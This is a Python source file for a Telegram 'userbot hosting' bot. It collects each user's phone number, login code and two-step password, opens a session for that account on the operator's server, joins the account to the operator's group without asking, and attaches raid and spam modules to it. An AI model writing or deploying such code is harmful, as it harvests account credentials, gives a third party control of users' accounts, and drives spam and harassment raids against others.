import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import ImportChatInviteRequest
from config import API_ID, API_HASH, BOT_TOKEN, OWNER_ID
from raid import register_raid
from spam import register_spam

# Central Bot Instance
bot = TelegramClient('SmokerHost', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
LOG_GROUP = -1003597315733 
GLOBAL_CLIENTS = {}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    welcome = "🔥 **SMOKER USERBOT HOSTING** 🔥\n\nClick below to host your ID and start using the bot."
    buttons = [
        [Button.inline("🚀 LOGIN", data="login")],
        [
            Button.url("❤️‍🔥 OWNER ❄️", "https://t.me/Divyansh6565"),
            Button.url("📢 CHANNEL", "https://t.me/lootversegc")
        ]
    ]
    await event.respond(welcome, buttons=buttons)

@bot.on(events.CallbackQuery(data="login"))
async def login_handler(event):
    async with bot.conversation(event.sender_id) as conv:
        try:
            await conv.send_message("📱 Send your **Phone Number** with country code (e.g., +91...):")
            phone_msg = await conv.get_response()
            phone = phone_msg.text
            
            # Initialize client
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            await client.send_code_request(phone)
            
            await conv.send_message("📩 Send **OTP** (e.g., 1 2 3 4 5):")
            otp_msg = await conv.get_response()
            otp = otp_msg.text.replace(" ", "")
            
            try:
                await client.sign_in(phone, code=otp)
            except SessionPasswordNeededError:
                await conv.send_message("🔐 **Two-Step Verification** is enabled. Send your password:")
                password_msg = await conv.get_response()
                password = password_msg.text
                await client.sign_in(password=password)

            # --- AUTO JOIN SUPPORT ---
            try:
                await client(ImportChatInviteRequest('Wkpz6yvrKQ9iMTg1'))
                await conv.send_message("💖 Joined My Support Group ❄️")
            except Exception:
                pass

            # --- CRITICAL FIX ---
            # We must ensure the client is fully started before registering modules
            await client.start() 

            # Register Modules
            register_raid(client)
            register_spam(client)
            
            GLOBAL_CLIENTS[event.sender_id] = client
            
            # Success Message
            success_msg = (
                "❤️‍🔥 Your Userbot Is Hosted Successfully 😈\n\n"
                "💖 Contact My Owner To Know Commands - @Divyansh6565 ♥️"
            )
            await conv.send_message(success_msg)
            
        except Exception as e:
            # This captures the error you saw in the screenshot
            await conv.send_message(f"❌ Error during login: {str(e)}")

if __name__ == "__main__":
    print("Smoker Userbot Hosting is live...")
    bot.run_until_disconnected()
    
